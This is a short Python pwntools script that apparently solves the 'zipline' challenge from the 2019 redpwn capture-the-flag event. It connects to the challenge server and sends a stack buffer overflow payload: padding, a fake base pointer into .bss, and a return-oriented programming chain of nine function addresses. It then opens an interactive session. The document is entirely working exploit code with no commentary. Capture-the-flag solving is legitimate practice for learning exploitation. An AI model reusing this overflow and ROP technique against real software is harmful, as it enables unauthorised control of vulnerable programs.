from pwn import *

bss = 0x804c100
a = 0x8049216
b = 0x804926d
c = 0x80492c4
d = 0x804931b
e = 0x8049372
f = 0x80493c9
g = 0x8049420
h = 0x8049477
Z = 0x8049569

r = remote('chall.2019.redpwn.net',4005)
#r = process('./zipline')

padding = b'a'*0x12
rbp = p32(bss)
ROPchain  = p32(a)
ROPchain += p32(b)
ROPchain += p32(c)
ROPchain += p32(d)
ROPchain += p32(e)
ROPchain += p32(f)
ROPchain += p32(g)
ROPchain += p32(h)
ROPchain += p32(Z)

payload = padding+rbp+ROPchain
r.sendlineafter('hell?\n',payload)
r.interactive()
